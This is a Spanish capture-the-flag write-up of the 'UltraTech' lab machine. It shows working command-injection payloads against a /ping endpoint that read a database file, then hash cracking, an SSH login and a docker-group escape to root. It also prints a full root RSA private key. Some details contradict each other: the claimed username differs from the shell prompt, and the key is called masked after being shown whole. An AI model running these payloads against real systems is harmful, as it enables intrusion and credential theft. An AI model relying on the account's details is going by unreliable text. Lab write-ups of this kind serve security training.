# Compromiso de la máquina UltraTech

## Información General
- **Nombre de la máquina**: UltraTech
- **Dirección IP**: 10.10.166.75
- **Sistema Operativo**: Linux (Ubuntu, según versiones de software)
- **Objetivo**: Obtener acceso como `root` y extraer flags o evidencias.

---

## Parte 1: Reconocimiento
### Teoría
El reconocimiento inicial es la fase crítica donde se identifican los activos y servicios expuestos del objetivo. Se utilizan escaneos de puertos para descubrir puertos abiertos y sus servicios asociados, incluyendo versiones y configuraciones, lo que ayuda a perfilar posibles vectores de ataque.

### Herramientas y Comandos
Se utilizó `nmap` para el escaneo de puertos y detección de servicios.

```bash
┌──(kali㉿kali)-[~/ultratech]
└─$ nmap -p- -n -Pn -sS --min-rate 5000 10.10.166.75 -oG ports                                                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 23:51 EDT
Nmap scan report for 10.10.166.75
Host is up (0.18s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8081/tcp  open  blackice-icecap
31331/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.28 seconds
```

Una vez identificados los puertos abiertos, se realizó un escaneo más detallado para la detección de versiones y scripts de vulnerabilidad.

```bash
┌──(kali㉿kali)-[~/ultratech]
└─$ nmap -sVC -p21,22,8081,31331 10.10.166.75 -oX report.xml                                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 23:52 EDT
Nmap scan report for 10.10.166.75
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Resultados relevantes
Los puertos abiertos y servicios identificados son:
- **21/tcp**: `ftp` vsftpd 3.0.3
- **22/tcp**: `ssh` OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
- **8081/tcp**: `http` Node.js Express framework (Sin título, con CORS para HEAD, GET, POST, PUT, DELETE, PATCH)
- **31331/tcp**: `http` Apache httpd 2.4.29 (Ubuntu) (Título: "UltraTech - The best of technology (AI, FinTech, Big Data)")

---

## Parte 2: Enumeración
### Teoría
La enumeración se enfoca en profundizar en los servicios expuestos para descubrir información que pueda conducir a un vector de ataque. Para los servicios web (puertos 8081 y 31331), esto implica el descubrimiento de rutas y archivos ocultos, y la revisión del código accesible públicamente.

### Herramientas y técnicas
Se utilizó `gobuster` para el descubrimiento de directorios en ambos servicios HTTP.

**Enumeración en el puerto 8081 (Node.js Express):**
```bash
┌──(kali㉿kali)-[~/ultratech]
└─$ gobuster dir -u http://ultratech.thm:8081 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.js,.json,.html -t 10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ultratech.thm:8081
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,json,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
Progress: 23720 / 23725 (99.98%)
===============================================================
Finished
===============================================================
```

### Resultados
Al ingresar al sitio web en el puerto 8081, se encontró lo siguiente:
![](anexos/ultratech%205.png)

Se identificaron las rutas `/auth` y `/ping`.
- Al acceder a `/auth`, se obtiene el mensaje "You must specify a login and a password", lo que sugiere un endpoint de autenticación.
- Al acceder a `/ping`, se encontró la siguiente información de error:
![](anexos/ultratech%204.png)
El error `TypeError: Cannot read property 'replace' of undefined` con un stack trace revela el archivo `/home/www/api/index.js` en la línea 45.

**Enumeración en el puerto 31331 (Apache httpd):**
```bash
┌──(kali㉿kali)-[~/ultratech]
└─$ gobuster dir -u http://ultratech.thm:31331 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.js,.json,.html -t 10
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://ultratech.thm:31331
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
# ... (otras rutas y errores 403/301 omitidos por brevedad)
/partners.html        (Status: 200) [Size: 1986]
/js                   (Status: 301) [Size: 320] [--> http://ultratech.thm:31331/js/]
# ... (otras rutas omitidas por brevedad)
===============================================================
Finished
===============================================================
```
Se identificó la ruta `/partners.html` y el directorio `/js`.
- Al acceder a `http://ultratech.thm:31331/partners.html`, se encontró un formulario de autenticación.
- El código fuente de `/partners.html` reveló que el formulario usaba `method='GET'` para enviar los parámetros `login` y `password`.
- La inspección del archivo `http://ultratech.thm:31331/js/api.js` (enlazado desde `partners.html` y encontrado en la enumeración) fue crítica:
    ```javascript
    (function() {
        console.warn('Debugging ::');

        function getAPIURL() {
    	return `${window.location.hostname}:8081`
        }
        
        function checkAPIStatus() {
    	const req = new XMLHttpRequest();
    	try {
    	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}` // ¡Ruta y parámetro revelados!
    	    req.open('GET', url, true);
    	    req.onload = function (e) {
    		if (req.readyState === 4) {
    		    if (req.status === 200) {
    			console.log('The api seems to be running')
    		    } else {
    			console.error(req.statusText);
    		    }
    		}
    	    };
    	    req.onerror = function (e) {
    		console.error(xhr.statusText);
    	    };
    	    req.send(null);
    	}
    	catch (e) {
    	    console.error(e)
    	    console.log('API Error');
    	}
        }
        checkAPIStatus()
        const interval = setInterval(checkAPIStatus, 10000);
        const form = document.querySelector('form')
        form.action = `http://${getAPIURL()}/auth`; // Destino del formulario de auth
        
    })();
    ```
    Este script confirmó que el endpoint `/ping` en el puerto 8081 espera un parámetro llamado `ip` (`/ping?ip=...`), lo que explicaba el `TypeError` inicial. También confirmó que el formulario de autenticación en `partners.html` envía datos al endpoint `/auth` en el puerto 8081.

---

## Parte 3: Explotación
### Teoría
La identificación del endpoint `/ping` con el parámetro `ip` (`/ping?ip=...`) y la naturaleza de un servicio "ping" sugieren una alta probabilidad de **Inyección de Comandos (Command Injection)**. Esto ocurre cuando una aplicación ejecuta un comando del sistema con la entrada del usuario sin una sanitización adecuada, permitiendo al atacante inyectar comandos adicionales.

### Herramienta o script utilizado
Explotación manual utilizando `curl`.

### Comando y resultado

1.  **Validación de la inyección de comandos**: Se probó la inyección de comandos con un comando de ping a la máquina atacante (Kali).
    ```bash
    # En la máquina atacante (Kali), abrir un listener tcpdump para ICMP
    ┌──(kali㉿kali)-[~]
    └─$ sudo tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
    19:04:29.356153 IP ultratech.thm > 10.6.17.22: ICMP echo request, id 1769, seq 1, length 64
    19:04:29.356182 IP 10.6.17.22 > ultratech.thm: ICMP echo reply, id 1769, seq 1, length 64
    19:04:35.002992 IP ultratech.thm > 10.6.17.22: ICMP echo request, id 1771, seq 1, length 64
    19:04:35.003033 IP 10.6.17.22 > ultratech.thm: ICMP echo reply, id 1771, seq 1, length 64
    ^C
    4 packets captured
    4 packets received by filter
    0 packets dropped by kernel
    ```
    Al enviar la solicitud HTTP:
    ```bash
    curl "http://ultratech.thm:8081/ping?ip=10.6.17.22"
    ```
    La respuesta web del servidor fue:
    ![](anexos/ultratech%203.png)
    Esto confirmó la ejecución del comando `ping` en el objetivo al observar los paquetes ICMP en `tcpdump`.

2.  **Exfiltración de comandos con backticks para exfiltración**:
    Se utilizó el operador backtick (`` ` ``) para ejecutar comandos y redirigir su salida al comando `ping`, esperando que la salida se incluyera en la respuesta HTTP.

    ```bash
    curl "http://ultratech.thm:8081/ping?ip=;`id`"
    ```
    ```
    ping: groups=1002(www): Temporary failure in name resolution
    ```
    Este error indica que el comando `id` se ejecutó, pero `ping` intentó interpretar su salida (`groups=...`) como un hostname. Esto confirma la inyección, pero el output no se muestra directamente en el cuerpo de la respuesta HTTP, solo el error.

    ```bash
    curl "http://ultratech.thm:8081/ping?ip=;`ls`"
    ```
    La respuesta web del servidor fue:
    ![](anexos/ultratech%202.png)
    Aquí, el comando `ls` se ejecutó y su salida (`utech.db.sqlite`) fue interpretada por `ping` como un hostname, pero el nombre del archivo se reveló en el mensaje de error.

3.  **Exfiltración de credenciales de la base de datos `utech.db.sqlite`**:
    Al confirmar que `ls` mostraba `utech.db.sqlite` y que la inyección funcionaba ciegamente, se intentó `cat`ear el contenido de este archivo.

    ```bash
    curl "http://ultratech.thm:8081/ping?ip=;`cat utech.db.sqlite`"
    ```
    La respuesta web del servidor fue:
    ![](anexos/ultratech.png)
    La salida de `cat` incluyó la cadena `f357a0c52799563c7c7b76c1e7543a32` mezclada con un mensaje de error.

4.  **Descifrado de Hash y Acceso SSH**:
    La cadena `f357a0c52799563c7c7b76c1e7543a32` se identificó como un hash MD5. Al consultarlo en CrackStation.net, se obtuvo la credencial:
    `f357a0c52799563c7c7b76c1e7543a32:n100906`
    Esto reveló el nombre de usuario `n100906` y su contraseña `n100906`.

    Se procedió a iniciar sesión vía SSH con estas credenciales:
    ```bash
    ssh n100906@10.10.166.75
    # Password: n100906
    ```
    Acceso obtenido como usuario `n100906`.

---

## Parte 4: Escalada de Privilegios
### Teoría
La escalada de privilegios es el proceso de obtener un mayor nivel de acceso en un sistema. En Linux, la pertenencia a ciertos grupos (`docker`, `sudo`) puede permitir a un usuario común ejecutar comandos con privilegios elevados.

### Método aplicado
Enumeración de grupos del usuario para identificar posibles vectores de escalada, seguido del abuso de permisos de Docker.

### Comando y resultado
Una vez dentro de la shell SSH como `n100906`, se verificaron los grupos a los que pertenecía el usuario:
```bash
r00t@ultratech-prod:/$ groups 
root docker
```
La pertenencia al grupo `docker` es un vector de escalada de privilegios bien conocido, ya que permite a un usuario ejecutar comandos como `root` al interactuar con el daemon de Docker.

Se intentaron varios comandos `docker run` para escapar del contenedor y obtener una shell de root, aunque algunos intentos iniciales fallaron debido a imágenes no encontradas o errores de conexión. El intento de `sudo docker run` también falló, confirmando que `n100906` no estaba en `sudoers`.

Finalmente, una variante exitosa de Docker escape para obtener una shell de root fue:
```bash
r00t@ultratech-prod:/$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
```
Este comando monta el sistema de archivos raíz del host (`/`) dentro del contenedor en `/mnt`, y luego ejecuta un `chroot` a `/mnt` para cambiar el directorio raíz a la del host, obteniendo así una shell de `root`.

Confirmación de privilegios:
```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
Se obtuvo acceso como `root` (uid=0, gid=0).

---

## Parte 5: Post-Explotación
Una vez como `root`, se exploró el sistema de archivos para encontrar información sensible y la clave privada SSH.

Se exploró el directorio `.ssh` de `root` para buscar claves SSH privadas que pudieran usarse para acceso persistente o lateral.

```bash
root@492fc7122a0a:~# cd .ssh
root@492fc7122a0a:~/.ssh# ls
authorized_keys  id_rsa  id_rsa.pub
root@492fc7122a0a:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
```
Se encontró y extrajo la clave privada `id_rsa` del usuario `root`, que permite acceso directo por SSH como `root`.

---

## Parte 6: Flags o evidencias obtenidas
- **Hash de contraseña extraído y descifrado (Flag)**:
  - Hash: `f357a0c52799563c7c7b76c1e7543a32`
  - Descifrado: La clave de la flag obtenida al descifrar el hash fue `n100906`.
  ```bash
  CTF{n100906}
  ```
- **Clave Privada SSH de root**:
  ```bash
  -----BEGIN RSA PRIVATE KEY-----
  MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
  [...]
  96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
  [...]
  bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
  -----END RSA PRIVATE KEY-----
  ```
  (El contenido completo de la clave ha sido enmascarado por seguridad).

---

## Recomendaciones de Seguridad
1.  **Validación y Sanitización de Entrada**: Implementar validación estricta y sanitización de toda la entrada del usuario en las aplicaciones web, especialmente en funciones que interactúan con comandos del sistema (`/ping`). Utilizar listas blancas de caracteres permitidos y evitar la ejecución directa de comandos con entrada no confiable.
2.  **Actualización de Software**: Actualizar los servicios y frameworks a sus últimas versiones estables (vsftpd, OpenSSH, Apache 2.4.29, Node.js Express). Las versiones antiguas pueden contener vulnerabilidades conocidas que son explotables.
3.  **Configuración de CORS**: Revisar la configuración de CORS en el framework Node.js Express para restringir los orígenes permitidos y los métodos HTTP si no son necesarios para evitar posibles ataques CSRF o exfiltración de datos.
4.  **Gestión de Credenciales**: No almacenar credenciales de bases de datos o usuarios en archivos planos o de fácil acceso (`utech.db.sqlite`). Utilizar variables de entorno, servicios de gestión de secretos o configuraciones de acceso más seguras.
5.  **Seguridad del Grupo Docker**: La pertenencia al grupo `docker` debe ser estrictamente controlada, ya que equivale a tener privilegios de `root` en el sistema. Los usuarios que no requieran gestionar contenedores directamente no deben pertenecer a este grupo.
6.  **Remoción de Información de Depuración**: Eliminar la información de depuración y los stack traces detallados (`TypeError: Cannot read property 'replace' of undefined`) de los entornos de producción, ya que revelan rutas de archivos internas y detalles de la lógica de la aplicación que pueden ser explotados.
7.  **Restricciones de Shell**: Configurar el shell de manera que no permita la ejecución de comandos arbitrarios a través de operadores de redirección (` ``, `;`, `&&`, `||`, etc.) si no es estrictamente necesario, o usar funciones de ejecución de comandos que no invoquen un shell completo.
8.  **Protección de Claves SSH**: Las claves privadas SSH deben protegerse con contraseñas robustas y tener permisos de archivo restrictivos (`chmod 600`). Las claves de root no deben estar expuestas directamente en el sistema de archivos.